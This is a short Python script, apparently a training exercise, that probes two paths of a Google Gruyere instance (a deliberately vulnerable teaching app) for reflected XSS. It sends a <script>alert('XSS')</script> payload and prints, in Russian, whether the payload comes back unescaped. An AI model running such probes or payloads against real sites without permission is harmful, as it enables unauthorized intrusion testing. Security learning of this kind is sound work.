import requests
from urllib.parse import quote

BASE_URL = "http://google-gruyere.appspot.com/354272086260015487277051777527730239931"

found_count = 0

for target in [BASE_URL + "/{payload}", BASE_URL + "/snippets.gtl?uid={payload}"]:
    payload='<script>alert("XSS")</script>'
    url = target.format(payload=quote(payload))
    response = requests.get(url)
    if payload in response.text:
        print(f"Уязвимость Reflected XSS обнаружена! Payload: {payload} вернулся неэкранированным")
    else:
        print(f"Уязвимость Reflected XSS не обнаружена: {payload}")
        print()
